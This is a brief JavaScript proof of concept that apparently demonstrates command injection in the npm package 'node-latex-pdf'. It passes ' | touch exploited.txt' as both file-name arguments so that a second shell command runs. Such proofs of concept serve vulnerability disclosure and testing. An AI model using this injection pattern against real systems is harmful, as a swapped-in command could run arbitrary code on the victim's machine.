
const pkg = require('node-latex-pdf');

const src_file = " | touch exploited.txt";
const dest_file = " | touch exploited.txt";

console.log(pkg);

const cb = function(error, data) {

};

pkg(src_file, dest_file, cb);